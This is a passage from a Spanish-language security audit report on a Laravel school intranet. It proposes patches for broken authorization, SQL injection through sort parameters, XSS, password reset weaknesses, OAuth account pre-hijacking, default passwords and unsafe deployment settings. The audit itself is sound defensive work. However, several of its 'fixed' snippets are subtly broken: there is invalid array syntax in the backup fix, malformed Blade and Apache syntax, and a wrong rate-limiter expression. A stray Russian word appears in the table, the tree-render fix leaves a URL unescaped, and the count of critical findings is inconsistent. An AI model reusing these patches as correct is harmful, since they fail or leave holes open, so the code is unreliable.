     * ✅ FIX C-03: el check ya no depende del middleware de la ruta (now role:admin)
     *             sino de una barrera fail-closed en cada acción.
     */
    private function authorizeAdmin(): void
    {
        abort_unless(Auth::user()->hasRole('admin'), 403, 'Acción solo para administradores.');
    }
    // Nótese: la ruta web.php:70 debería además quedar como
    //    Route::resource('teachers', TeacherController::class)->middleware('can:admin')->only([...]);
    // o directamente `->middleware('role:admin')` —  DEFENSA EN PROFUNDIDAD.

    public function store(Request $request) { $this->authorizeAdmin(); /* ... */ }
    public function update(Request $request, $id)
    {
        $this->authorizeAdmin();

        $validated = $request->validate([
            'name'     => 'required|string|max:255',
            'email'    => 'required|email|max:255|unique:users,email,'.$id,
            'password' => 'nullable|string|min:8|max:64',   // password pues se Hashea
            'departamento' => 'nullable|string|max:100',
        ]);

        $teacher = User::role('profesor')->findOrFail($id);

        // ✅ FIX 2: NO pasar $request->all() — solo campos validados
        $data = collect($validated)->except(['password'])->all();
        if ($validated['password'] ?? false) {
            $data['password'] = $validated['password'];   // cast 'hashed' en User.php ya encripta
        }
        $teacher->update($data);
        return redirect()->route('teachers.index')
                         ->with('success', 'Profesor actualizado correctamente.');
    }

    public function destroy($id)
    {
        $this->authorizeAdmin();
        $teacher = User::role('profesor')->findOrFail($id);
        // ✅ (lógica original de delete sin cambios)
    }
}
```

**`app\Http\Controllers\StudentController.php` — patrón fail-closed aplicado a todos los métodos (update/store/destroy/bulk):**
```php
    private function authorizeAdminOrTutor(User $student): void
    {
        $user = Auth::user();

        // ✅ FAIL-CLOSED: solo admin, directiva o ES tutor del grupo del alumno pasan.
        $allowed = $user->hasAnyRole(['admin', 'directiva'])
            || ($user->hasRole('profesor')
                && Group::where('tutor_id', $user->id)->where('id', $student->group_id)->exists());

        abort_unless($allowed, 403, 'No tienes permisos sobre este alumno.');
    }

    public function update(Request $request, User $student)
    {
        $this->authorizeAdminOrTutor($student);     // ← bloquea a 'alumno', 'conserje', sin rol

        $validated = $request->validate([
            'name'      => 'required|string|max:255',
            'last_name' => 'required|string|max:255',
            'email'     => 'required|email|unique:users,email,' . $student->id,
            'password'  => 'nullable|string|min:8',
            'group_id'  => ['nullable','exists:groups,id',
                // ✅ extra: solo admin cambia de grupo (tutor no saca del grupo)
                Rule::when(!$request->user()->hasAnyRole(['admin','directiva']),
                    fn () => $request->group_id === $student->group_id,
                ),
            ],
        ]);
        $data = collect($validated)->except('password')->all();
        if ($validated['password'] ?? false) $data['password'] = $validated['password'];
        $student->update($data);
        /* ... */
    }

    public function destroy(User $student)
    {
        $this->authorizeAdminOrTutor($student);   // ← aplica también a bulkDelete y bulkChangeGroup
        /* ... */
    }
```

**`app\Livewire\ParteDiario.php:82-110` y `GuardiaController.php:106-124` — fail-closed:**
```php
    // ParteDiario.php
    public function confirmarGuardia(int $ausenciaId, ?int $guardiaUserId)
    {
        // ✅ FIX A-02: existe usuario y además es PROFESOR en la lista de guardia o directivo
        $user = auth()->user();
        $ausencia = Ausencia::with(['timeSlot']) ->findOrFail($ausenciaId);
        $availableTeacherIds = GuardiaEquityService::candidatesFor($ausencia)->pluck('id')->all();

        $isTeacheringOnGuard = in_array($user->id, $availableTeacherIds, true);
        $isDirector = $user->hasAnyRole(['admin', 'directiva']);

        abort_unless($isTeacheringOnGuard || $isDirector, 403,
            'Solo personal docente en guardia o dirección puede confirmar guardias.');

        // ✅ solo directivos pueden asignar otros (guardia_user_id != self)
        $guardiaUserId = ($isDirector && $guardiaUserId)
            ? (int) $guardiaUserId
            : $user->id;
        /* ... resto de la lógica original ... */
    }
```

---

### A-01 fix › Whitelist centralizada de `sort`/`direction` (elimina SQLi en 10+ controladores)

**`app\Http\Concerns\SortsQueries.php` (nuevo trait):**
```php
<?php

namespace App\Http\Concerns;

use Illuminate\Http\Request;

trait SortsQueries
{
    /**
     * Devuelve [columna valida, direccion segura].
     *  - $allowed: mapa columna-valida => nombre-columna-BD reales
     *  - Si el request trae un valor no permitido, cae al default del mapa.
     */
    protected function sortParams(Request $request, array $allowed, string $default = 'created_at'): array
    {
        $sort      = (string) $request->input('sort', $default);
        $direction = strtolower((string) $request->input('direction', 'desc'));

        // ✅ solo las columnas del mapa pasan; cualquier otra → default
        if (!array_key_exists($sort, $allowed)) {
            return [$allowed[$default] ?? $default, 'desc'];
        }

        return [$allowed[$sort], in_array($direction, ['asc', 'desc'], true) ? $direction : 'desc'];
    }
}
```

**Cambio aplicado en cada controlador afectado (ejemplo `MessageController.php:87-90`):**
```php
    use SortsQueries;

    public function sent(Request $request)
    {
        // ❌ ANTES: $sort = $request->get('sort','created_at'); $direction = $request->get('direction','desc');
        [$sort, $direction] = $this->sortParams($request, [
            'subject'      => 'subject',
            'created_at'   => 'created_at',
            'receiver'     => 'receiver_id',   // si el query original usa essa coluna
        ]);

        // ❌ ANTES: $query->orderBy($sort, $direction);
        // ✅ con el helper $sort/$direction ya están en whitelist; orderBy(...) es seguro
        $query->orderBy($sort, $direction);
```
+ **Aplicar en:** `IncidenciaController`, `UserController`, `RoleController`, `ObservacionAlumnoController`, `DocumentoController`, `AulaController`, `ModuloController`, `ActividadController`, `ZonaController`, `SesionController`, `TeacherController`, `StudentController`, `SchoolYearController`, `RecursoController`.
+ **`HallPassController.php:458-460`:** sustituir inline por  `$direction === 'desc' ? 'DESC' : 'ASC'` explícito (solo se acepta literal do código):
```php
$directionSql = strtolower($direction ?? '') === 'desc' ? 'DESC' : 'ASC';   // solo dos valores posibles
$query->orderByRaw('(julianday(end_time) - julianday(start_time)) ' . $directionSql);
```

---

### A-03 fix › Eliminar mass assignment de restos

**`app\Http\Controllers\SesionController.php:120-130`:**
```php
    public function update(Request $request, Sesion $sesion)
    {
        // ✅ ownership/limitar a admin o autor de la sesión
        abort_unless(auth()->id() === $sesion->profesor_id || auth()->user()->hasRole('admin'), 403);

        $validated = $request->validate([
            'fecha'      => 'required|date',
            'hora_inicio'=> 'required',
            'hora_fin'   => 'required|after:hora_inicio',
            'grupo_id'   => 'required|exists:grupos,id',
            'modulo_id'  => 'required|exists:modulos,id',
            'aula_id'    => 'nullable|exists:aulas,id',
            // ❌ teacher_id/profesor_id NO se aceptan del request → propiedad protegida
        ]);

        // ✅ ERROR del original: $sesion->update($request->all());  → permitía cambiar profesor_id
        $sesion->update($validated);
        return redirect()...;
    }
```
Aplica el mismo patrón de `$request->validated()` o `$request->safe([...])` en: `CriterioEvaluacionController`, `ResultadoAprendizajeController`, `RecursoController`, `ZonaController`, `ObservacionAlumnoController`, `DocumentoController::update` (con `except(['user_id'])`).

**`app\Models\User.php:30-46` — quitar campos sensibles de `$fillable`:**
```php
    // ❌ ANTES:
    // protected $fillable = [ ..., 'password', 'google_id', 'must_change_password', 'active_role', ...];
    protected $fillable = [
        'name','last_name','email','avatar','group_id','department',
    ];

    // ✅ usar $guarded microcontrolado o escritura forzada vía forceFill():
    protected $guarded = [
        'id',
        'password',              // escrito solo vía forceFill en PasswordReset/Profile
        'google_id',             // escrito solo en SocialAuthController
        'must_change_password',  // escrito solo en AuthController/PasswordReset/Profile
        'active_role',           // escrito solo en ProfileController::switchRole
        'favorite_groups',       // cast array; escrito solo en HallPassController::toggleFavoriteGroup
    ];
```
*(Ajustar los pocos controladores que los escriben a `forceFill([...])` — patrón ya usado en `PasswordResetController:83` —, lo que además auto-documenta quién toca qué.)*

---

### A-04 / A-05 fix › Sanitización del render en Blade (defensa ligada a C-01)

**`resources\views\categorias\_tree.blade.php` — reemplazo del helper inline:**
```blade
@php
    function renderTree($items) {
        $html = '';
        foreach ($items as $item) {
            // ✅ FIX: escapar TODO dato de usuario con e() (nativo de Blade helper)
            $html .= '<li>'
                . '<a href="' . $item->url . '">' . e($item->nombre) . '</a>';
            if (isset($item->children) && count($item->children) > 0) {
                $html .= '<ul>' . renderTree($item->children) . '</ul>';
            }
            $html .= '</li>';
        }
        return $html;
    }
@endphp
```

**`resources\views\aulas\show.blade.php:2` + `actividades\show.blade.php:2` (cortar el vector del título hacia el layout en A-04):**
```blade
{{-- ❌ ANTES: @section('title', $aula->nombre) → cae en {!! $defaultModuleTitle !!} del layout (raw)
     ✅ FIX: la página html title lee de la data de confianza; el layout mostrará escapado. --}}
@section('title', e($aula->nombre))
```
+ **En `layouts\app.blade.php:973, 1006`:**
```blade
{{-- Cambiar el render por defecto del título de raw ({!! !!}) a escapado ({{ !!}) --}}
<title>{{ $defaultModuleTitle ?? config('app.name') }} — ... </title>
```

**`resources\views\calendar\index.blade.php:625-637` (DOM XSS fix):**
```javascript
// ❌ ANTES: container.innerHTML = events.map(e => `...${e.title}${e.description}...`).join('');

// ✅ FIX: crear nodos con textContent (no parsea HTML)
const frag = document.createDocumentFragment();

events.forEach(e => {
    const card = document.createElement('div');
    card.className = 'event-card';
    // color como atributo controlado por whitelist, no interpolado:
    if (['red','orange','yellow','green','blue','purple','teal'].includes(e.color)) {
        card.classList.add('bg-' + e.color);
    }

    const title = document.createElement('strong');
    title.textContent = e.title ?? '';      // ← seguro

    const desc = document.createElement('p');
    desc.textContent = e.description ?? ''; // ← seguro

    if (e.attachment_url) {
        const a = document.createElement('a');
        a.href = e.attachment_url;          // atributo de URL (nativo; navigation no inyecta HTML)
        a.textContent = 'Adjunto';
        a.rel = 'noopener';
        card.append(a);
    }

    card.append(title, desc);
    frag.append(card);
});
container.replaceChildren(frag);
```

---

### C-04 / M-01 / M-07 fix › Reset de contraseña con TTL + respuesta genérica + sin log + throttle

**`app\Http\Controllers\PasswordResetController.php` — re-escritura de sendResetLinkEmail / reset:**
```php
    public function sendResetLinkEmail(Request $request)
    {
        $request->validate(['email' => 'required|email']);

        // ✅ FIX rate limit modernizador adicional anti-abuso por email
        $key = 'reset-attempt:'.$request->email;
        if (RateLimiter::tooManyAttempts($key, 3)) {
            return back()->withErrors(['email' => 'Demasiados intentos. Reinténtalo más tarde.']);
        }
        RateLimiter::hit($key, 60 * 10);

        $user = User::where('email', $request->email)->first();

        // ✅ FIX M-01: SIEMPRE mismo mensaje (anti-enumeración) — no revela si la cuenta existe
        $genericStatus = 'Si el correo existe en nuestro sistema, hemos enviado un enlace de restablecimiento.';

        if ($user) {
            $token = Str::random(64);

            // ✅ FIX C-04: guardar expires_at (necesita nueva migration)
            DB::table('password_reset_tokens')->updateOrInsert(
                ['email' => $request->email],
                [
                    'email'      => $request->email,
                    'token'      => Hash::make($token),
                    'created_at' => Carbon::now(),
                    // después de migration: 'expires_at' => Carbon::now()->addHour(),
                ],
            );

            $resetLink = route('password.reset', ['token' => $token, 'email' => $request->email]);
            Mail::to($user->email)->send(new ResetPasswordMail($resetLink));

            // ❌ ELIMINADO: Log::info("... {$resetLink}");   → el enlace NUNCA se escribe en log
            // ❌ ELIMINADO: el mensaje ≠ mensaja que lista el archivo de log al usuario
        }

        return back()->with('status', $genericStatus);
    }

    public function reset(Request $request)
    {
        $request->validate([
            'token'   => 'required|string',
            'email'   => 'required|email',
            'password'=> ['required','confirmed', 'min:10',
                          Password::min(10)->uncompromised()],  // reforzado
        ]);

        // ✅ FIX rate limit: throttle al endpoint de reset (routes/web.php también)
        $key = 'reset-use'. $request->ip();
        abort_if(RateLimiter::tooManyAttempts($key, 5), 429);
        RateLimiter::hit($key, 60);

        $reset = DB::table('password_reset_tokens')->where('email', $request->email)->first();

        // ✅ FIX C-04: TTL 60 minutos — si la migration lo añadió. Si NO: fallback creado_at.
        $tooOld = ! $reset || $reset->created_at->lt(now()->subHour()); // + expires_at si existe
        if ($tooOld || ! Hash::check($request->token, $reset->token)) {
            return back()->withErrors(['email' => 'Este enlace es no válido o ha caducado.']);
        }

        $user = User::where('email', $request->email)->first();
        if (!$user) { return redirect()->route('login'); }      // ✅ genérico (M-01)

        $user->forceFill([
            'password' => Hash::make($request->password),
            'must_change_password' => false,
        ])->setRememberToken(Str::random(60));
        $user->save();

        DB::table('password_reset_tokens')->where('email', $request->email)->delete();
        Auth::logoutOtherDevices($request->password);
        return redirect()->route('login')->with('status', 'Su contraseña se ha restablecido correctamente.');
    }
```
**`routes/web.php:25-33` — throttle en reset POST:**
```php
Route::post('reset-password', [PasswordResetController::class, 'reset'])
     ->middleware('throttle:5,1')          // ✅ NUEVO
     ->name('password.update');
```

---

### C-05 / C-06 fix › OAuth seguro + fin de contraseñas por defecto

**`app\Http\Controllers\SocialAuthController.php:19-72` — versión segura:**
```php
<?php
...
class SocialAuthController extends Controller
{
    /** ✅ FIX C-05: solo cuentas del dominio del centro.
     *  Configurar en .env: GOOGLE_ALLOWED_DOMAINS=centro.edu.es
     *  y en config/services.php lee el valor desde env(...). */
    protected function allowedDomain(): string { return config('services.google.allowed_domain'); }

    public function handleGoogleCallback()
    {
        try {
            $googleUser = Socialite::driver('google')->user();

            // ✅ FIX: verificar email verificado + dominio (anti pre-hijacking y open-registration)
            if (!$googleUser->email || $googleUser->email_verified === false) {
                return redirect()->route('login')
                    ->with('error', 'La cuenta de Google no tiene un correo verificado.');
            }
            $domain = substr(strrchr($googleUser->email, '@'), 1);
            if ($domain !== $this->allowedDomain()) {
                return redirect()->route('login')
                    ->with('error', 'Debe utilizar únicamente la cuenta corporativa del centro.');
            }

            // ✅ FIX: relación SOLO por google_id (o email solo si esa dirección fue previamente verificada).
            $user = User::where('google_id', $googleUser->id)->first();

            if (!$user) {
                // ✅ FIX: NO login por orWhere('email'). Si el email existe sin google_id,
                // solo se vincula tras autenticar por contraseña (anti pre-hijack).
                $existing = User::where('email', $googleUser->email)->first();
                if ($existing) {
                    return redirect()->route('login')->with('info',
                        'Ya existe una cuenta con ese email. Inicie sesión con contraseña para vincular su cuenta.');
                }

                // Registro: solo manual/por invitación desde Secretaría (cuenta creada por admin).
                // Opción recomendada: DENEGAR el auto-registro e informar al usuario.
                return redirect()->route('login')
                    ->with('error', 'No hay una cuenta asociada. Solicite acceso en Secretaría.');
                // (Alternativa mínima: crear alumno con dominio verificado, pero JAMÁS por email-compatible.)
            }

            Auth::login($user);
            ...
        }
    }
```
> Reglas clave del fix: 1) relación **solo por `google_id`**; 2) **jamás login por email sin contraseña**; 3) whitelist `@centro.edu` en `.env`/`config/services.php`; 4) el rol se asigna por alta administrativa, no por defecto en Google callback.

**`app\Http\Controllers\AuthController.php:29-40` + eliminación del esquema:**
```php
    if (Auth::attempt($credentials, $request->boolean('remember'))) {
        $request->session()->regenerate();
        $user = Auth::user();

        // ✅ FIX C-06: la detección de contraseñas iniciales POR VALOR se elimina del código.
        // La señalización pasa a ser EXPLÍCITA: bandera must_change_password=true fijada
        // por las rutas de alta (UserController, StudentImportController, TeacherController)
        // y por un comando one-shot a implementar (p. ej. `intranet:mark-default-passwords`)
        // que marque en BD a las cuentas que aún usan contraseñas por defecto.
        if ($user->must_change_password) {
            return redirect()->route('profile.edit')
                ->with('warning', 'Debes cambiar tu contraseña antes de continuar.');
        }
        ...
    }
```
**`app\Http\Controllers\StudentImportController.php:149-158` — password por usuario (no global):**
```php
    // ❌ ANTES: $defaultPasswordHash = Hash::make('alumno1234');   ← proyecto y match conocido
    // ✅ FIX: contraseña aleatoria por usuario NO revelada en la app (solo entrego por vía presencial/pdf
    //        a secretaría o contraseña inicial en correo única del centro).
    $credentials = [];
    foreach ($rows as $row) {
        $initialPassword = Str::password(12, symbols: false);   // única por alumno
        User::create([
            ...
            'password' => $initialPassword,
            'must_change_password' => true,
            ...
        ]);
        $credentials[] = ['email' => $row['email'], 'password' => $initialPassword]; // entrega puntual a Secretaría
    }
    // Contraseñas iniciales: jamás persistidas ni logueadas; solo export puntual con expiración.
```

---

### C-06/Auth-complemento › Login hardened + fuerte contra fuerza bruta
**`routes/web.php:25-37` (nueva config):**
```php
// ✅ login POST ya tiene throttle:6,1 → reforzar además con límite POR CUENTA (anti-rotación de IP):
RateLimiter::for('login', function (Request $request) {
    return Limit::perMinute(5)->by(strtolower($request->input('email'))).'|'.$request->ip();
});
// ✅ reset-password POST y auth/google/callback con middleware throttle:10,1
```
*(Aplicación práctica: usar `throttle:5,1` en callback Google y `password.update`, y limpiar estados del rate limiter al login OK — Laravel lo hace si se usa el Lockout del middleware estándar.)*

---

### A-06 fix › BackupController sin fugas de credenciales

**`app\Http\Controllers\BackupController.php` — sección mysql:**
```php
    public function store()
    {
        ...
        // ✅ FIX A-06: contraseña sin exponer en cmdline (nada del ACCESS via '--password='):
        // 1) genera un fichero de defaults (my.cnf temporal) con perms 0600 y se destrulirlo después
        $defaults = tempnam(sys_get_temp_dir(), 'mycnf_');
        file_put_contents($defaults, [
            '[client]',
            "user={$db['username']}",
            "password={$db['password']}",
            "host={$db['host']}",
            "port={$db['port']}",
        ];
        chmod($defaults, 0600);

        $command = sprintf('"%s" --defaults-extra-file=%s "%s" --result-file="%s" 2>&1',
            $mysqldump,
            escapeshellarg($defaults),
            escapeshellarg($db['database']),
            escapeshellarg($filepath),
        );
        exec($command, $output, $result);
        @unlink($defaults);   // destruye credenciales en memoria temporal

        if ($result !== 0) {
            Log::error('mysqldump falló', ['exit_code' => $result, 'output_head' => Str::limit(implode(' ', $output), 200)]);
            // ❌ NO mostrar NEVER la command/contraseña al user en la flash de error
            return redirect()->route('backups.index')->with('error',
                'Error al crear el backup. Consulte el log de la aplicación.');
        }
        return redirect()->route('backups.index')->with('success', "Copia creada: {$filename}");
    }
```

---

### A-08 / A-09 fix › Endurecimiento de Config de despliegue (producción)

**`.env` (todos los valores: reemplazar al desplegar):**
```dotenv
APP_ENV=production                     # ❌ ANTES: local
APP_DEBUG=false                        # ❌ ANTES: true
APP_URL=https://intranet.centro.edu    # ❌ ANTES: http://localhost
SESSION_SECURE_COOKIE=true             # ⚠ ANTES: no definida
SESSION_ENCRYPT=true                   # refuerzo: cipherabla vs C-01 robo de cookie
# (opcional) FORCE_HTTPS=true
```

**`bootstrap\app.php` (aplicar sólo en producción).  Añadir al final del `withMiddleware` o en `AppServiceProvider:boot`:**
```php
    // bootstrap\app.php → dentro ->withMiddleware(function (Middleware $middleware): void {
        $middleware->trustProxies(at: '*');            // si hay reverse-proxy
    // });
    // En "AppServiceProvider::boot()" (o handler dedicado):
    if (config('app.env') === 'production') {
        \Illuminate\Support\Facades\URL::forceScheme('https');
    }
```
+ **Configurar el VirtualHost de XAMPP para que apunte a `public/`, NO a la raiz del proyecto** (bloquea A-09):
```apache
<VirtualHost *:443>
    DocumentRoot "C:/xampp/htdocs/grintranetedu2/public"   {/* ✅ NO la raíz */}
    <Directory "C:/xampp/htdocs/grintranetedu2/public">
        Options -Indexes
        AllowOverride All
        Require all granted
    </Directory>
    # Denegar todo acceso HTTP directo a ficheros de backend:
    <FilesMatch "\\.(env|lock|md)$">
        Require all denied
    </FilesMatch>
</VirtualHost>
```

---

## 4. Recomendaciones Adicionales

### 4.1 Plan de remediación priorizado

| Prioridad | Acción | Reduce riesgo de |
|---|---|---|
| **P0 (hoy)** | Desplegar con `APP_DEBUG=false`, vhost → `public/`, HTTPS forzado, `SESSION_SECURE_COOKIE=true` | A-08, A-09, C-04 |
| **P0** | Deshabilitar callback Google o whitelist dominio + single-`google_id` matching (C-05) y remover esquema de `defaultPassword` (C-06) | C-05, C-06, parte de C-03 |
| **P0** | Meter `role:admin` en `routes/web.php` para `teachers`, y fail-closed en `StudentController`, calendar CRUD, guardias, parte | C-03, A-02 |
| **P1 (esta semana)** | Instalar HTMLPurifier + sanitizar `body`/`nombre`/`title` en 5 vistas (C-01, A-04, A-05) | C-01, A-04, A-05 |
| **P1** | Whitelist `sort`/`direction` con el trait `SortsQueries` en todos los listados | A-01 |
| **P1** | Validar adjuntos CalendarController + disco privado + download authz | C-02 |
| **P1** | TTL de tokens reset, sin log, respuesta genérica, throttle en `password.update` | C-04, M-01 |
| **P2 (2 semanas)** | Cambiar `$request->all()` → `$request->validated()` en 8 controladores; revisar `$fillable` de `User` | A-03 |
| **P2** | Reemplazar checks `hasRole('admin|directiva')` → `hasAnyRole([...])`; unificar lista de roles directiva/directivo | A-07 |
| **P2** | Rate limit `auth/google*` + `per_page` con `min(50,$request->integer(...))` | A-10, B-03 |
| **P3** | Migrar adjuntos de `public` a молодой discos privados con `Storage::download` bajo authz; CSP headers (`default-src 'self'; script-src 'self'`) | C-02, F7 | 

### 4.2 Arquitectura de seguridad recomendada

1. **Policies en vez de checks dispersos:** crear `App\Models\Policies\{NotaPower,AusenciaPolicy,SesionPolicy,CalendarEventPolicy,UserManagementPolicy}` + `Gate::authorize(...)`/`$this->authorize($model, 'manage')`. Reduce la superficie de bypass por ~50% y facilita el testing.
2. **Middleware de roles vía `->middleware('can:...')` en rutas de recursos grupal:** aplicar a `teachers`, `students`, `users`, `aulas`, `recursos`, `aulas/import`, `schedule-templates`, `inventory`.
3. **FormRequests sistemáticos** en vez de `$request->validate([...])` inline para toda operación de escritura (mejora testing, DRY y evita el mass assignment con `validated()`).
4. **El CSS/JS del frontend de mensajes/editor:** si se quiere mantener Quill con HTML, cambiar a un Markdown renderer seguro (`Parsedown` con `safeMode:true`; el body no guarda raw, sino Markdown).
5. **Monitoreo y alertas:** log de eventos de autenticación anomalía (Intentos de login fallados por IP/email, `hasAnyRole` aborts con count alto en 10 min → alarma) vía `LogManager`.
6. **Spatie `Backup` package (TenycTechnologies)** para reemplazar `BackupController` manual: backups programados, cifrado (`--encrypt`), storage remoto (S3), notificaciones por Slack/[método de email]. Aportarees también elimina el path `exec` manual el arma a A-06.
7. **Testing de seguridad:** añadir test suite para regresión de cada fix (`php artisan test --filter=Security`): docente-por-alumno-takeover, SQLi sort/direction, XSS body-guardado-sanitizado, OAuth pre-hijack, upload .php re-generico, reset-token sin expiración. Ver 8/`phpunit.xml` mejores prácticas.
8. **Detección depósito de XSS render en editorial HTMLQuill** (guest); verificación de versión de Quill para CVE.
9. **`audit/security-audit-report.md` ses de auditoría** — este report. Recordar: re-subirlo al strict-mode (npm/pint: security-checker Roave/security-checker o `composer audit`) tras cada adaptación del composer.lock.

### 4.3 Hardening operativo de XAMPP (transición de dev → prod)

- Deshabilitar **`mod_php manipulation`** si no se usa, o isolación via `php_admin_flag engine off` en htdocs no-public; en PHPStack → **PHP-FPM** con `open_basedir` por project.
- `php.ini`: `expose_php=Off`, `display_errors=Off`, `log_errors=On`, `mail.log` (configura el mail log que se indica en PasswordResetController)* — de nuevo: eliminar la dependencia del MAIL_MAILER=log en producción.
- Backup **storage/app/backups** fuera de la carpeta servible (está en `storage/app` — solo servible dir `public/` en xampp convention, ok si vhost→public).
- Envíos de emails reales con SMTP del centro → `MAIL_MAILER=smtp` (reset via email y no logs).
- Rotar y revisar acceso al fila `.env` dentro de ovnt roles del equipo IT.

### 4.4 Recomendación estructural defensiva clave

> **El patrón sistémico a corregir es la decisión implícita de "restringir solo si el rol es profesor y omitir al resto"** que atraviesa decenas de métodos (los `if hasRole(...)` sin `abort` en la rama `else`). Corregir el enfoque a **"fail-closed por defecto: `abort_unless($permiso)` en la PRIMERA línea de cada action"**. Con eso, y un único trait/método `authorizeFor(...)`, la superficie de autorización queda completa y bajo control. Además, cualquier rol nuevo que se añada al sistema quedará bloqueado por defecto, en lugar de heredar permisos accidentalmente.

---

## 5. Firma

Este informe ha sido generado por análisis estático del código fuente + lectura directa de los ficheros críticos con verificación de cada hallazgo. **No se modificó ningún fichero funcional del proyecto** — el único fichero creado es este documento de informe.

**Próxima acción sugerida:** validar cuanto antes en Directorio de Informática del centro las **5 vulnerabilidades críticas** (C-01 a C-06) y cuñar plan de hotfix de autorización con el trío (Cores TIC + Dirección de Seguridad).

---

## 6. Anexo A — Hotfix detallado: `TeacherController` + `StudentController` (C-03 / C-06 / A-02)

> Código corregido **ajustado al código real del proyecto** (firmas, nombres de columnas y vistas existentes, verificados). El fix aplica el principio fail-closed y elimina el esquema de contraseñas por defecto.

### 6.1 Diagnóstico exacto (evidencia verificada)

**`TeacherController`** (`routes/web.php:65-70` — resource bajo solo `auth`):
```php
public function update(Request $request, $id)       // :99 — SIN check de rol del actor
{
    $teacher = User::role('profesor')->findOrFail($id);   // filtra el TARGET, nunca el ACTOR
    ...
    if ($request->filled('password')) { $data['password'] = Hash::make($request->password); }
    $teacher->update($data);                        // → alumno puede rehacer cuenta de un profesor
```
Tres vectores adicionales en el mismo fichero:
- `store:78-86` → `'password' => Hash::make($request->password ?: $request->email)` — si el admin no escribe contraseña, **la contraseña inicial es el email** (C-06).
- `import:291` → `'password' => Hash::make(trim($row['email']))` — **mismo esquema en masa**.
- `bulkDelete:339-351` y `destroy:129-134` — sin check del actor.
- `export:136-155` — exporta PII (nombre, email, observaciones de profesores) sin restricción.

**`StudentController`** (`routes/web.php:57-63` — resource bajo solo `auth`): el patrón `if ($user->hasRole('profesor') && !$user->hasRole('admin')) {...}` (líneas 92-97, 119-124, 140-145, 156-161, 185-190) es **fail-open**: para `alumno`, `conserje` o cualquier otro rol la condición es `false` y **el flujo de delete/update continua sin abort**. Además:
- `store:104` → `'password' => Hash::make($request->password ?: $request->email)` — contraseña inicial = email (C-06).
- `findOrFail($id)` sobre `users` sin restringir al rol `alumno` (un tutor podría tocar usuarios no-alumnos si el ID coincide).
- `bulkDelete`/`bulkChangeGroup` (post-289, ver informe A-02) heredan el mismo hueco.

### 6.2 `routes/web.php` — defensa en profundidad en las rutas (líneas 57-70)

```php
    // ── Student Manager ──
    Route::post('students/bulk-delete', [StudentController::class, 'bulkDelete'])->name('students.bulk-delete');
    Route::post('students/bulk-change-group', [StudentController::class, 'bulkChangeGroup'])->name('students.bulk-change-group');
    Route::get('students/export/{format}', [StudentController::class, 'export'])->name('students.export');
    Route::get('students/template/{format}', [StudentController::class, 'template'])->name('students.template');
    Route::post('students/import-mass', [StudentController::class, 'import'])->name('students.mass-import');

    Route::middleware('can:manage-students')->group(function () {   // ✅ NUEVO
        Route::resource('students', StudentController::class);
    });

    // ── Teacher Manager (CRUD docente = SOLO admin) ──
    Route::post('teachers/bulk-delete', [TeacherController::class, 'bulkDelete'])->name('teachers.bulk-delete');
    Route::get('teachers/export/{format}', [TeacherController::class, 'export'])->name('teachers.export');
    Route::get('teachers/template/{format}', [TeacherController::class, 'template'])->name('teachers.template');
    Route::post('teachers/import-mass', [TeacherController::class, 'import'])->name('teachers.mass-import');

    Route::middleware('can:manage-teachers')->group(function () {   // ✅ NUEVO
        Route::resource('teachers', TeacherController::class);
    });
```

### 6.3 Gate centralizado (`app\Providers\AppServiceProvider.php`, dentro de `boot()`)

```php
use Illuminate\Support\Facades\Gate;
use App\Models\User;

Gate::define('manage-teachers', fn (User $user) => $user->hasRole('admin'));
// Nota: el Gate::before() existente (AppServiceProvider:30-32) ya concede "admin => true";
// este Gate explícito asegura además fail-closed si se retira ese bypass global en el futuro.

Gate::define('manage-students', function (User $user, User $student = null) {
    if ($user->hasAnyRole(['admin', 'directiva'])) return true;
    if ($user->hasRole('profesor') && $student) {
        // Solo el TUTOR del grupo del alumno puede gestionar a ese alumno
        return \App\Models\Group::where('tutor_id', $user->id)->where('id', $student->group_id)->exists();
    }
    return false;   // ✅ fail-closed: alumno/conserje/otro rol → false SIEMPRE
});
// Con $student null (index/create/bulk) solo pasan admin/directiva/profesor:
Gate::define('browse-students', fn (User $user) =>
    $user->hasAnyRole(['admin', 'directiva', 'profesor']));
```

### 6.4 `app\Http\Controllers\TeacherController.php` — versión corregida completa

```php
<?php

namespace App\Http\Controllers;

use App\Models\User;
use App\Models\Group;
use Spatie\Permission\Models\Role;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Str;
use Illuminate\Validation\Rule;
use Illuminate\Validation\Rules\Password;

class TeacherController extends Controller
{
    private function checkProfesorRoleExists()
    {
        return Role::where('name', 'profesor')->exists();
    }

    public function index(Request $request)
    {
        // ✅ FIX: el directorio de profesores es admin-only (también visible a profesores si el negocio lo pide)
        abort_unless(auth()->user()->hasAnyRole(['admin', 'profesor']), 403);

        $roleExists = $this->checkProfesorRoleExists();

        $query = $roleExists ? User::role('profesor') : User::whereRaw('1 = 0');

        if ($request->filled('search')) {
            $search = $request->search;
            $query->where(function ($q) use ($search) {
                $q->where('name', 'like', "%{$search}%")
                  ->orWhere('last_name', 'like', "%{$search}%")
                  ->orWhere('email', 'like', "%{$search}%")
                  ->orWhere('departamento', 'like', "%{$search}%")
                  ->orWhere('observaciones', 'like', "%{$search}%");
            });
        }

        // ✅ FIX A-01: whitelist de sort (original: in_array sobre $sort solo, direction libre)
        $sort = in_array($request->input('sort'), ['name','last_name','email','departamento','created_at'], true)
            ? $request->input('sort') : 'name';
        $direction = $request->input('direction') === 'desc' ? 'desc' : 'asc';

        if (in_array($sort, ['name','last_name','email','departamento','created_at'])) {
            $query->orderBy($sort, $direction);
        } else {
            $query->orderBy('name', 'asc');
        }

        // ✅ FIX: límite máximo en per_page (anti DoS, B-03)
        $perPage = $request->get('per_page', 30);
        if ($perPage === 'all') {
            $perPage = max(1, $query->count());
        } else {
            $perPage = min(500, max(1, (int) $perPage));
        }
        $teachers = $query->paginate($perPage)->appends($request->query());

        return view('teachers.index', compact('teachers', 'sort', 'direction', 'perPage', 'roleExists'));
    }

    public function create()
    {
        // ✅ FIX C-03
        Gate::authorize('manage-teachers');

        if (!$this->checkProfesorRoleExists()) {
            return redirect()->route('teachers.index')
                ->with('error', 'El rol "profesor" no existe. Créalo en Administración > Roles.');
        }

        return view('teachers.create');
    }

    public function store(Request $request)
    {
        Gate::authorize('manage-teachers');      // ✅ FIX C-03

        if (!$this->checkProfesorRoleExists()) {
            return back()->withErrors('El rol "profesor" no existe en el sistema.');
        }

        $request->validate([
            'name'         => 'required|string|max:255',
            'last_name'    => 'required|string|max:255',
            'departamento' => 'nullable|string|max:255',
            'observaciones'=> 'nullable|string|max:2000',
            'email'        => 'required|email|max:255|unique:users',
